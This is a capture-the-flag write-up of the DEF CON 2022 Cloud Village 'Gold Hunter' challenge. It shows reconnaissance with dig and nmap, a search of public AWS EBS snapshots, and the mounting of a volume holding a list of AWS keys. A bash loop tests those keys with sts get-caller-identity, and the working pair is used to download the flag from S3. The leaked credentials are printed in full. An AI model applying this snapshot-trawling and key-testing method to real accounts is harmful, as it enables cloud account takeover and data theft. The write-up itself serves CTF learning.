---
layout: post
title:  "CV CTF - Gold Hunter"
date:   2022-09-10 10:00:00 -0600
categories: ctf cloudvillage
tags: defcon ctf cloudvillage
description: "Writeup/Solution to Defcon 2022 Cloud Village CTF: Gold Hunter(400 points)"
---

This challenge turned into one of the longest and most difficult for us. All of us took different approaches and I won't be including all of them.

## Prompt

>Mr Porter is visting Las Vegas for the first time. He has tried his luck on multiple games but with no good luck. He has finally stumbled upon a computer hosting the site - goldhunter.cloud-village.org/ which he thinks will help him get the gold and make him super rich. Being a techie, he is sure that use the knowledge he has to be smarter than Casino and get into the system. Could you help Porter in finding gold?

**Hint:**
>Fun Fact: Domains resolves to IPs

### Website

Going to the website http://goldhunter.cloud-village.org/ results in a network timeout. We pull theA Recordof the domain (because of the hint) and then scan for open ports.

```console
$ dig goldhunter.cloud-village.org

; <<>> DiG 9.18.1-1ubuntu1.1-Ubuntu <<>> goldhunter.cloud-village.org
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10496
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;goldhunter.cloud-village.org.	IN	A

;; ANSWER SECTION:
goldhunter.cloud-village.org. 154 IN	A	44.208.149.105
```

```console
$ nmap 44.208.149.105

Host is up (0.00083s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE
80/tcp   closed http
443/tcp  closed https
8000/tcp open   http-alt
```

**NOTE:** At the time of writing this challenge is no longer up, so some of these commands/screenshots are limited and/or dated.

From this scan we see that port `8000` appears to be open and NMAP has marked it as a potential `http` service. Instead of default port 80 for http, let's manually go to `http://40.208.149.105:8000`:

![gold hunter screenshot](/assets/images/gold-hunter-website.png)

Clicking `Try Your Luck` makes a `POST` to `/check`.

We spent a lot of time with different inputs trying to figure out if it was expecting a value or if there was an exploit involved. I will be skipping over these attempts for two reasons; 1) the webpage is no longer up and I don't have any screenshots, 2) it ended up not being relevant at all.

### Header

Although the `POST` call didn't end up being relevant to the problem, there _was_ an interesting piece of information in the _headers_: `snap-065d5531e8132301c`.

This header was the same across submissions and sessions, but we had to figure out what it meant. My first thought was that it was referencing a [snap package](https://en.wikipedia.org/wiki/Snap_(software)) so I looked up `065d5531e8132301c` on [snap](https://snapcraft.io/) but with no results. Finally, someone recalled that the year prior [AWS EBS Snapshots](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSSnapshots.html) were involved. An EBS Snapshot is a copy of a virtual disk at a given point in time; they are useful for creating regular backups or before making a change on a critical system.

There are a couple key features that EBS Snapshots have:
- An EBS volume can be created from it
- They can be made **public**

Public EBS Snapshots are region specific and can be searched for in the AWS console. This could take a while to do by hand, so I used a handy bash script to iterate over each region:

```bash
regions=( us-east-1 us-east-2 us-west-1 us-west-2 ap-south-1 ap-northeast-3 ap-northeast-2 ap-southeast-1 ap-southeast-2 ap-northeast-1 ca-central-1 eu-central-1 eu-west-1 eu-west-2 eu-west-3 eu-south-1 )
for i in "${regions[@]}"
do
    echo -n "Region: ${i}"
    aws ec2 describe-snapshots --region ${i} > ${i}
done
```
This generates a file for each region so we will know where the snapshot is if it exists:

```bash
$ grep -r snap-065d5531e8132301c ./
./us-east-1:            "SnapshotId": "snap-065d5531e8132301c",
```

We have a hit! The full snapshot description is:

```json
{
	"Description": "",
	"Encrypted": false,
	"OwnerId": "856467976326",
	"Progress": "100%",
	"SnapshotId": "snap-065d5531e8132301c",
	"StartTime": "2022-07-13T20:08:28.120000+00:00",
	"State": "completed",
	"VolumeId": "vol-05f671a10f2a7bdf9",
	"VolumeSize": 2,
	"StorageTier": "standard"
}
```

Now that we know the region, we can make an EBS volume from it and attach it to an instance to see what is on it. Don't make my mistake and be sure to specify the same availability zone for the volume and the instance, otherwise it won't be attachable.

![gold hunter attach volume](/assets/images/attach-volume-gold-hunter.png)

Once the volume is attached to the EC2 instance, we can log in and mount it:

```console
$ sudo mkdir /mnt/writeup && sudo mount /dev/sdf /mnt/writeup
```

The only thing on the image is a single file called `test.py`:
```python
aws_secret_access_key = ZTPR+vSVKCll0qnAZ2SY/rILVqQ672XojnklHwkV
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIAYVP4CIPPCEG6DTMQ
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
aws_secret_access_key = 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
aws_access_key_id = AKIA4O2LYGCDMOACSJEW
```

Although this file has a `.py` extension, it seems that it is a bunch of different secret keys and a couple of different key IDs. To figure out which ones are active I made a quick bash script that used the `aws sts get-caller-identity` as a validation:

```bash
keys=(
ZTPR+vSVKCll0qnAZ2SY/rILVqQ672XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ673XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ674XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ675XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ676XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ677XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ678XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ679XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ680XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ681XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ682XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ683XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ684XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ685XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ686XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ687XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ688XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQPg9XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ690XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ691XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ692XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ693XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ694XojnklHwkV
ZTPR+vSVKCll0qnAZ2SY/rILVqQ695XojnklHwkV
)

for k in "${keys[@]}"; do
	AWS_ACCESS_KEY_ID='AKIA4O2LYGCDMOACSJEW' \
	AWS_SECRET_ACCESS_KEY=${k} \
	AWS_REGION=us-east-1 aws sts get-caller-identity
	echo "Done: ${k}"
done
```

All of these fail except one:

```json
{
    "UserId": "AIDA4O2LYGCDBWSOEE5SC",
    "Account": "856467976326",
    "Arn": "arn:aws:iam::856467976326:user/ctf-goldhunter"
}
```
With the matching secret `ZTPR+vSVKCll0qnAZ2SY/rILVqQPg9XojnklHwkV`.

Now that we had the access key and secret, we would again have to start poking around to see what we had access to.
Unfortunately, I don't have a list of everything we tried, but we _eventually_ found the S3 bucket `goldhunter`:

```console
$ AWS_ACCESS_KEY_ID='AKIA4O2LYGCDMOACSJEW' \
AWS_SECRET_ACCESS_KEY='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' \
aws s3 cp s3://goldhunter/flag.txt flag.txt
```

Opening `flag.txt` has the flag!